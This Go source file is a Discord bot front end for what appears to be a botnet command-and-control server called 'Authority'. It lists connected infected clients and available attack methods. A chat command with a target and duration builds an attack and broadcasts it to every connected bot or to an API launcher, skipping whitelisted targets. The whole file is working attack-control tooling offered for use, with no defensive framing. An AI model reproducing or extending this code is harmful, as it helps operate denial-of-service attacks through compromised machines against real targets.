package Discord

import (
	"fmt"
	"strings"
	"time"

	"HellSing/HellStruct"

	"HellSing/cnc"

	"github.com/bwmarrin/discordgo"
)

var (
	DiscordConn *discordgo.Session
	botCatagory string
	botCount    int
	err         error
)

func Connect() {
	botCount = cnc.Clist.Count()

	DiscordConn, err = discordgo.New("Bot " + HellStruct.Configuration.Bot.Token)
	if err != nil {
		fmt.Println("\033[38;5;241m[\033[38;2;191;0;0mAuthority\033[38;5;241m.] [" + err.Error() + "]")
	}

	DiscordConn.AddHandler(messageCreate)

	err = DiscordConn.Open()
	if err != nil {
		fmt.Println("\033[38;5;241m[\033[38;2;191;0;0mAuthority\033[38;5;241m.] [" + err.Error() + "]")
		return
	}
	go func() {
		DiscordConn.UpdateGameStatus(0, fmt.Sprintf("[%d] Clients.", cnc.Clist.Count()))
		time.Sleep(15 * time.Second)
	}()

}

func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
	if m.Author.ID == s.State.User.ID {
		return
	}
	if len(m.Content) == 0 {
		return
	}
	if m.Content[:1] == HellStruct.Configuration.Bot.Prefix {
		cmd := m.Content[1:]
		splitcmd := strings.Split(cmd, " ")
		fmt.Println(len(splitcmd))
		if cmd == "help" {
			embed := &discordgo.MessageEmbed{
				Author:      &discordgo.MessageEmbedAuthor{},
				Color:       000000, // Green
				Description: "Authority Help.",
				Fields: []*discordgo.MessageEmbedField{
					{
						Name:   "Methods",
						Value:  "Shows Authority.s methods",
						Inline: true,
					},
					{
						Name:   "Bots",
						Value:  "Shows currently connected bots to Authority.",
						Inline: true,
					},
				},
				Thumbnail: &discordgo.MessageEmbedThumbnail{
					URL: "https://i1.wp.com/i.pinimg.com/originals/cf/5d/4f/cf5d4f9571ad36a16ea02eb9cc532ab0.jpg",
				},
				Timestamp: time.Now().Format(time.RFC3339), // Discord wants ISO8601; RFC3339 is an extension of ISO8601 and should be completely compatible.
				Title:     "Authority.",
			}
			s.ChannelMessageSendEmbed(m.ChannelID, embed)

		}
		if cmd == "pong" {
			s.ChannelMessageSend(m.ChannelID, "Ping!")

		}
		if cmd == "bots" {
			embed := &discordgo.MessageEmbed{
				Author:      &discordgo.MessageEmbedAuthor{},
				Color:       000000, // Green
				Description: "Currently connected bots",
				Thumbnail: &discordgo.MessageEmbedThumbnail{
					URL: "https://i1.wp.com/i.pinimg.com/originals/cf/5d/4f/cf5d4f9571ad36a16ea02eb9cc532ab0.jpg",
				},

				Timestamp: time.Now().Format(time.RFC3339), // Discord wants ISO8601; RFC3339 is an extension of ISO8601 and should be completely compatible.
				Title:     "Authority.",
			}
			clsist := cnc.Clist.Distribution()
			botCount = cnc.Clist.Count()
			for bot, cnt := range clsist {
				fields := make([]*discordgo.MessageEmbedField, 0)
				fields = append(fields, &discordgo.MessageEmbedField{
					Name:   bot,
					Value:  fmt.Sprintf("Count %d", cnt),
					Inline: true,
				})
				embed.Fields = append(embed.Fields, fields...)
			}
			embed.Fields = append(embed.Fields, &discordgo.MessageEmbedField{
				Name:   "Total",
				Value:  fmt.Sprintf("%d", botCount),
				Inline: true,
			})
			s.ChannelMessageSendEmbed(m.ChannelID, embed)

		}
		if cmd == "methods" {
			embed := &discordgo.MessageEmbed{
				Author:      &discordgo.MessageEmbedAuthor{},
				Color:       000000, // Green
				Description: "Authority Methods.",
				Thumbnail: &discordgo.MessageEmbedThumbnail{
					URL: "https://i1.wp.com/i.pinimg.com/originals/cf/5d/4f/cf5d4f9571ad36a16ea02eb9cc532ab0.jpg",
				},

				Timestamp: time.Now().Format(time.RFC3339), // Discord wants ISO8601; RFC3339 is an extension of ISO8601 and should be completely compatible.
				Title:     "Authority.",
			}
			for bot, cnt := range cnc.AttackInfoLookup {
				fmt.Println(bot, cnt.AttackDescription)
				fields := make([]*discordgo.MessageEmbedField, 0)
				fields = append(fields, &discordgo.MessageEmbedField{
					Name:   bot,
					Value:  cnt.AttackDescription,
					Inline: true,
				})
				embed.Fields = append(embed.Fields, fields...)
			}
			s.ChannelMessageSendEmbed(m.ChannelID, embed)

		}
		if cmd == "exit" {
			DiscordConn.Close()
		}
		if cmd == "purge" {
			messages, _ := s.ChannelMessages(m.ChannelID, 100, "", "", "")
			var ids []string
			for _, id := range messages {
				ids = append(ids, id.ID)
			}
			s.ChannelMessagesBulkDelete(m.ChannelID, ids)
		}
		atk, err := cnc.NewDiscordAttack(m.Content, 1)
		if err != nil {
			if !strings.Contains(err.Error(), "not a valid") {
				s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("%s\r\n", err.Error()))
			}
		} else {
			buf, err := atk.Build()
			if err != nil {
				s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("%s\r\n", err.Error()))
			} else {
				if strings.Contains(string(buf[0]), "http://") {
					if !cnc.Db.ContainsWhitelistedTargets(atk) {
						cnc.LaunchAPI(string(buf[0]))
						embed := &discordgo.MessageEmbed{
							Author:      &discordgo.MessageEmbedAuthor{},
							Color:       000000, // Green
							Description: fmt.Sprintf("Attack Command broadcasted to %d clients", botCount),
							Thumbnail: &discordgo.MessageEmbedThumbnail{
								URL: "https://i1.wp.com/i.pinimg.com/originals/cf/5d/4f/cf5d4f9571ad36a16ea02eb9cc532ab0.jpg",
							},
							Fields: []*discordgo.MessageEmbedField{
								{
									Name:  "Target",
									Value: splitcmd[1],
								},
								{
									Name:  "Duration",
									Value: splitcmd[2],
								},
							},

							Timestamp: time.Now().Format(time.RFC3339), // Discord wants ISO8601; RFC3339 is an extension of ISO8601 and should be completely compatible.
							Title:     "Authority.",
						}
						s.ChannelMessageSendEmbed(m.ChannelID, embed)
					}
				} else {
					if !cnc.Db.ContainsWhitelistedTargets(atk) {
						cnc.Clist.QueueBuf(buf, -1, "")
						var YotCount int
						YotCount = cnc.Clist.Count()
						embed := &discordgo.MessageEmbed{
							Author:      &discordgo.MessageEmbedAuthor{},
							Color:       000000, // Green
							Description: fmt.Sprintf("Attack Command broadcasted to %d clients", YotCount),
							Thumbnail: &discordgo.MessageEmbedThumbnail{
								URL: "https://i1.wp.com/i.pinimg.com/originals/cf/5d/4f/cf5d4f9571ad36a16ea02eb9cc532ab0.jpg",
							},
							Fields: []*discordgo.MessageEmbedField{
								{
									Name:  "Target",
									Value: splitcmd[1],
								},
								{
									Name:  "Duration",
									Value: splitcmd[2],
								},
							},

							Timestamp: time.Now().Format(time.RFC3339), // Discord wants ISO8601; RFC3339 is an extension of ISO8601 and should be completely compatible.
							Title:     "Authority.",
						}
						s.ChannelMessageSendEmbed(m.ChannelID, embed)
					}
				}
			}
		}
	}
}
